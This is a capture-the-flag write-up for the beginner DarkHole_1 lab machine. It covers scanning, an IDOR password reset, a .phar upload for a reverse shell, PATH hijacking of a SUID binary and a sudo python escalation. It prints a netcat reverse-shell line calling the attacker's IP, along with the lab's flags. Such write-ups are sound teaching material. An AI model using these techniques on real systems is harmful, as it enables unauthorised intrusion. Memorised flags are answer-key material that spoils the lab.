# DarkHole_1 Writeup

# Description
```bash

Difficulty: Easy

It's a box for beginners, but not easy, Good Luck

Hint: Don't waste your time For Brute-Force
```
\
Let's start with a network scan 
```bash
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.104   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                                 
 192.168.0.108   00:0c:29:c4:0d:ab      1      60  VMware, Inc.                                                                                                                                                   
 192.168.0.102   d8:80:83:cf:7a:77      1      60  CLOUD NETWORK TECHNOLOGY SINGAPORE PTE. LTD.
```
\
Next, Port scan
```bash
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
```
Accessing port 80 gives
\
<img width="1717" height="727" alt="image" src="https://github.com/user-attachments/assets/1c151cf8-c1ac-4cfb-b910-9b90376174e2" />
\
Then running dirb
```bash
dirb http://192.168.0.108/           

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 18 06:47:50 2026
URL_BASE: http://192.168.0.108/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.108/ ----
==> DIRECTORY: http://192.168.0.108/config/                                                                                                                                                                       
==> DIRECTORY: http://192.168.0.108/css/                                                                                                                                                                          
+ http://192.168.0.108/index.php (CODE:200|SIZE:810)                                                                                                                                                              
==> DIRECTORY: http://192.168.0.108/js/                                                                                                                                                                           
+ http://192.168.0.108/server-status (CODE:403|SIZE:278)                                                                                                                                                          
==> DIRECTORY: http://192.168.0.108/upload/                                                                                                                                                                       
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.108/config/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.108/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.108/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.108/upload/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Feb 18 06:47:54 2026
DOWNLOADED: 4612 - FOUND: 2
```
\
<img width="444" height="275" alt="image" src="https://github.com/user-attachments/assets/2d9674e6-5c02-4778-8927-482b1ab12aeb" />
\
there was a interesting file database.php in /config , but not viewable
\
<img width="1393" height="714" alt="image" src="https://github.com/user-attachments/assets/943dee63-0c10-46d6-ba93-facdfc3585a4" />
\
So we go to login.php , i check for sqli but not vulnerable
\
There was a register page , so i just registered and logged in using those creds
\
<img width="1719" height="710" alt="image" src="https://github.com/user-attachments/assets/3253f85a-68b7-4b5d-a815-75ca1f74c976" />
\
I tried for idor , but didnt work directly
\
<img width="506" height="123" alt="image" src="https://github.com/user-attachments/assets/c4084a83-5120-46e2-b49a-e9d4f5a6d708" />
\
Then i went to burpsuite and intercepted the req to change id to 1 while updating password
\
<img width="621" height="322" alt="image" src="https://github.com/user-attachments/assets/aae6407e-5700-4f47-b756-4d91a0fe9053" />
\
And it worked
\
<img width="1711" height="476" alt="image" src="https://github.com/user-attachments/assets/70db5f0f-7aa6-41e9-92b0-a1a792c0b2c2" />
\
Then in the file upload functionality , i changed the extension to .phar and it worked
\
<img width="1367" height="620" alt="image" src="https://github.com/user-attachments/assets/a4caf01a-de2a-4ab9-adaa-249605cce254" />
\
So we get a rev shell by accesssing from /uploads
```
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.111
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from darkhole~192.168.0.108-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/darkhole~192.168.0.108-Linux-x86_64/2026_02_18-07_06_11-965.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@darkhole:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
\
After some checking , we get db creds
```bash
www-data@darkhole:/var/www/html/config$ cat database.php 
<?php
$connect = new mysqli("localhost",'john','john','darkhole');

```
\
then we check home dir of user john
```bash
www-data@darkhole:/home/john$ ls -la
total 72
drwxrwxrwx 5 john john      4096 Jul 17  2021 .
drwxr-xr-x 4 root root      4096 Jul 16  2021 ..
-rw------- 1 john john      1722 Jul 17  2021 .bash_history
-rw-r--r-- 1 john john       220 Jul 16  2021 .bash_logout
-rw-r--r-- 1 john john      3771 Jul 16  2021 .bashrc
drwx------ 2 john john      4096 Jul 17  2021 .cache
drwxrwxr-x 3 john john      4096 Jul 17  2021 .local
-rw------- 1 john john        37 Jul 17  2021 .mysql_history
-rw-r--r-- 1 john john       807 Jul 16  2021 .profile
drwxrwx--- 2 john www-data  4096 Jul 17  2021 .ssh
-rwxrwx--- 1 john john         1 Jul 17  2021 file.py
-rwxrwx--- 1 john john         8 Jul 17  2021 password
-rwsr-xr-x 1 root root     16784 Jul 17  2021 toto
-rw-rw---- 1 john john        24 Jul 17  2021 user.txt
```
\
We see a SUID file "toto" and also .ssh folder group perms to www-data 
\
```bash
www-data@darkhole:/home/john/.ssh$ ls -la
total 20
drwxrwx--- 2 john www-data 4096 Jul 17  2021 .
drwxrwxrwx 5 john john     4096 Jul 17  2021 ..
-rw------- 1 john www-data 2602 Jul 17  2021 id_rsa
-rw-r--r-- 1 john www-data  567 Jul 17  2021 id_rsa.pub
-rw-r--r-- 1 john www-data  222 Jul 17  2021 known_hosts
www-data@darkhole:/home/john/.ssh$ cat id_rsa
cat: id_rsa: Permission denied
```
\
but no perms to read
\
So lets check the toto file, which just gave id of user john as output , so i used path hijacking
```bash
www-data@darkhole:/tmp$ echo "/bin/bash -i" > id
www-data@darkhole:/tmp$ export PATH=/tmp:$PATH
www-data@darkhole:/tmp$ chmod +x id 
www-data@darkhole:/tmp$ /home/john/toto 
john@darkhole:/tmp$ id
john@darkhole:/tmp$ whoami
john
```
\
After switching to user john , if we need to use "id" , we can just change the path variable
```bash
john@darkhole:/tmp$ export PATH=/bin:/usr/bin
john@darkhole:/tmp$ id
uid=1001(john) gid=33(www-data) groups=33(www-data)
```
\
and i was checking his home dir again 
```bash
john@darkhole:/home/john$ ls -la
total 72
drwxrwxrwx 5 john john      4096 Jul 17  2021 .
drwxr-xr-x 4 root root      4096 Jul 16  2021 ..
-rw------- 1 john john      1735 Feb 18 12:26 .bash_history
-rw-r--r-- 1 john john       220 Jul 16  2021 .bash_logout
-rw-r--r-- 1 john john      3771 Jul 16  2021 .bashrc
drwx------ 2 john john      4096 Jul 17  2021 .cache
drwxrwxr-x 3 john john      4096 Jul 17  2021 .local
-rw------- 1 john john        37 Jul 17  2021 .mysql_history
-rw-r--r-- 1 john john       807 Jul 16  2021 .profile
drwxrwx--- 2 john www-data  4096 Jul 17  2021 .ssh
-rwxrwx--- 1 john john         1 Jul 17  2021 file.py
-rwxrwx--- 1 john john         8 Jul 17  2021 password
-rwsr-xr-x 1 root root     16784 Jul 17  2021 toto
-rw-rw---- 1 john john        24 Jul 17  2021 user.txt
john@darkhole:/home/john$ python3 file.py 
john@darkhole:/home/john$ file password 
password: ASCII text
john@darkhole:/home/john$ ./password 
./password: line 1: root123: command not found
john@darkhole:/home/john$ cat password 
root123
john@darkhole:/home/john$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
exit
john@darkhole:/home/john$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on darkhole:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on darkhole:
    (root) /usr/bin/python3 /home/john/file.py
```
\
So password of user john was "root123"
\
So , we can just becoem root by executing rev shell payload in file.py
```bash
john@darkhole:/home/john$ cat file.py 
import os

os.system("busybox nc 192.168.0.111 4445 -e /bin/sh")
```
\
Then we become root
```bash
oot@darkhole:/home/john# cd /root
root@darkhole:~# ls -la
total 44
drwx------  6 root root 4096 Jul 17  2021 .
drwxr-xr-x 20 root root 4096 Jul 15  2021 ..
-rw-------  1 root root 2879 Feb 18 12:33 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jul 17  2021 .cache
drwxr-xr-x  3 root root 4096 Jul 17  2021 .local
-rw-------  1 root root   18 Jul 15  2021 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Jul 15  2021 .ssh
-rw-r--r--  1 root root   25 Jul 17  2021 root.txt
drwxr-xr-x  3 root root 4096 Jul 15  2021 snap
root@darkhole:~# cat root.txt 
DarkHole{You_Are_Legend}
root@darkhole:~# cat /home/john/user.txt 
DarkHole{You_Can_DO_It}
```
\
The End ,Thank you for reading till here
